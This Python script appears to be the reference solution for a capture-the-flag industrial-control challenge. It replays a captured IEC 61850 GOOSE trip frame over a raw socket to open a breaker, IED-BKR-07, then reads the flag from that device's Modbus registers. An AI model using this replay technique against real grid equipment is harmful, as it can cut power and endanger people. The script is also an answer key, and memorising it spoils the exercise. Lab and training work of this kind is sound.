#!/usr/bin/env python3
"""
Ghost Command -- step 2 of the reference solve.

Run this on the JUMP BOX. It takes the hex string printed by find_frame.py
(run locally against the downloaded pcap -- there's no way to get the pcap
file itself onto the jump box without going through docker, so the two
steps are split), replays those exact raw bytes onto the wire, then reads
IED-BKR-07's Modbus holding registers to confirm the trip landed and pull
out the flag. Self-contained: nothing else from solution/ needs to be
copied over.

Usage (needs sudo for the raw L2 socket):
    sudo python3 replay.py <hex-string-from-find_frame.py>
"""

import socket
import sys
import time

from pymodbus.client import ModbusTcpClient

ETHERTYPE_GOOSE = 0x88B8
IFACE = "eth0"
BKR_HOST = "10.13.39.20"
BKR_PORT = 502
UNIT_ID = 1
FLAG_REG_START = 100


def replay(raw_frame):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETHERTYPE_GOOSE))
    sock.bind((IFACE, ETHERTYPE_GOOSE))
    sock.send(raw_frame)
    sock.close()
    print("[+] replayed the genuine trip frame onto the wire")


def read_flag():
    client = ModbusTcpClient(BKR_HOST, port=BKR_PORT)
    client.connect()
    tripped = client.read_holding_registers(1, count=1, slave=UNIT_ID).registers[0]
    print(f"[+] breaker tripped register = {tripped}")

    chars = []
    addr = FLAG_REG_START
    while True:
        val = client.read_holding_registers(addr, count=1, slave=UNIT_ID).registers[0]
        if val == 0:
            break
        chars.append(chr(val))
        addr += 1
    client.close()
    return "".join(chars)


def main():
    if len(sys.argv) != 2:
        raise SystemExit("usage: sudo python3 replay.py <hex-string>")

    raw_frame = bytes.fromhex(sys.argv[1])
    replay(raw_frame)
    time.sleep(1)

    flag = read_flag()
    if not flag:
        raise SystemExit("no flag in registers yet -- replay may not have reached ied-bkr")
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
